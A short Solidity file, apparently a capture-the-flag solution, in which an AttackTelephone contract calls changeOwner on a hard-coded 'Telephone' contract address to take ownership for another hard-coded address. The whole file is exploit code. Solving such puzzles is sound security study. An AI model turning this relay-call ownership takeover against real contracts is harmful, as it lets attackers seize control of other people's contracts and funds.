pragma solidity ^0.4.24;

contract Telephone {
    function changeOwner(address _owner) public {}
}

contract AttackTelephone {

    address public owner;
    Telephone callTelephone = Telephone(0x9e520686792b3faca9ed3226c49d9de96c4227e0);

    function becomeOwner() public {
        callTelephone.changeOwner(0xaa50ecca520935de9833768e3928d0d1506f6782);
    }
}